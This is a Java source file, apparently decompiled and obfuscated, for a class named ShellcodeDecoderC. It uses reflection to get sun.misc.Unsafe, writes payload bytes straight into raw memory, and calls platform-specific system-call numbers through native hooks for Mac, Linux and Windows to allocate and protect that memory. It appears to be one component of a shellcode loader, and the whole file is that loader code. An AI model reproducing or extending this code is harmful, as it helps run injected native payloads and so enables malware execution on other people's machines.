import java.lang.reflect.Field;
import sun.misc.Unsafe;

public final class ShellcodeDecoderC implements PayloadDecoder {
   private static Unsafe a_Unsafe = a();
   private NativeHookBase a_ko_1;
   private int a_int_2;
   private int b;
   private int c;

   public ShellcodeDecoderC() {
      if (PlatformUtil.f()) {
         this.a_ko_1 = new NativeHookMac();
         this.a_int_2 = 9;
         this.b = 10;
         this.c = 11;
      } else if (PlatformUtil.e()) {
         this.a_ko_1 = new NativeHookLinux();
         this.a_int_2 = 192;
         this.b = 125;
         this.c = 91;
      } else if (PlatformUtil.d()) {
         this.a_ko_1 = new NativeHookWindows();
         this.a_int_2 = 222;
         this.b = 226;
         this.c = 215;
      } else {
         throw new RuntimeException();
      }
   }

   @Override
   public final void a(long var1, byte[] var3, int var4) {
      int var5 = 0;

      for (int var6 = 0; var6 < var4; var6++) {
         a_Unsafe.putByte(var1 + var5, var3[var6]);
         var5++;
      }
   }

   private static Unsafe a() {
      try {
         Field var0;
         (var0 = Unsafe.class.getDeclaredField("theUnsafe")).setAccessible(true);
         return (Unsafe)var0.get(null);
      } catch (Exception var1) {
         throw new RuntimeException(var1);
      }
   }

   @Override
   public final long a(long var1, int var3, int var4) {
      return this.a_ko_1.a_long(this.a_int_2, var1, var3, var4);
   }

   @Override
   public final int a(long var1, long var3, int var5) {
      return (int)this.a_ko_1.b(this.b, var1, var3, var5);
   }

   @Override
   public final int a(long var1, long var3) {
      return (int)this.a_ko_1.b_long(this.c, var1, var3);
   }

   @Override
   public final long a(long var1, long var3, long var5) {
      return this.a_ko_1.a_long(var1, var3, var5);
   }
}
